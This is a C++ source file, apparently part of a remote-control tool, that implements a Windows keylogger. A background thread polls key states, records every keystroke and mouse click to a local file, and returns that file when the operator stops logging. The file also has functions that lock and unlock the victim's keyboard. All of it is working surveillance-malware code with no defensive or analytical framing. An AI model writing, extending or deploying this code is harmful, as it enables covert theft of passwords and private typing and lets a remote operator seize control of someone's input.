#include "syscalls.h"

std::atomic<bool> keyloggerRunning = false;

void LOG(std::string input) {
	std::fstream LogFile;
	LogFile.open("dat.txt", std::fstream::app);
	if (LogFile.is_open()) {
		LogFile << input << " ";
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG("#SPACE");
		return true;
	case VK_RETURN:
		LOG("#RETURN");
		return true;
	case '¾':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG("#SHIFT");
		return true;
	case VK_BACK:
		LOG("#BACKSPACE");
		return true;
	case VK_LBUTTON:
		LOG("#L_CLICK");
		return true;
	case VK_RBUTTON:
		LOG("#R_CLICK");
		return true;
	case VK_CAPITAL:
		LOG("#CAPS_LOCK");
		return true;
	case VK_TAB:
		LOG("#TAB");
		return true;
	case VK_UP:
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		LOG("#ALT");
		return true;
	case VK_ESCAPE:
		LOG("#ESCAPE");
		return true;
	case VK_END:
		LOG("#END");
		return true;
	default:
		return false;
	}
}

void Keylogger()
{
	unsigned char KEY;

	while (keyloggerRunning) {
		Sleep(10);
		for (KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					std::fstream LogFile;
					LogFile.open("dat.txt", std::fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY) << " ";
						LogFile.close();
					}

				}
			}
		}
	}
}

bool startKeylogger(std::string& result) {
	if (keyloggerRunning) {
		result = "Keylogger already running";
		return false;
	}
	keyloggerRunning = true;

	remove("dat.txt");

	std::thread t(Keylogger);
	t.detach();
	result = "Keylogger started";

	return true;
}

bool stopKeylogger(std::string& result, std::ifstream& file) {
	if (!keyloggerRunning) {
		result = "Keylogger not running";
		return false;
	}

	keyloggerRunning = false;
	result = "Keylogger stopped";
	file.open("dat.txt", std::fstream::in);

	return true;
}

bool lockKeyboard(std::string& result) {
	bool res = BlockInput(true);
	if (!res) {
		// Check if the server is running as administrator
		bool elevated = isElevated();
		if (!elevated)
			result = "Failed to lock keyboard. The server is not running as administrator.";
		else
			result = "Failed to lock keyboard. Keyboard may already be locked.";
		return false;
	}
	result = "Keyboard locked";
	return true;
}

bool unlockKeyboard(std::string& result) {
	bool res = BlockInput(false);
	if (!res) {
		result = "Failed to unlock keyboard. Keyboard may already be unlocked.";
		return false;
	}
	result = "Keyboard unlocked";
	return true;
}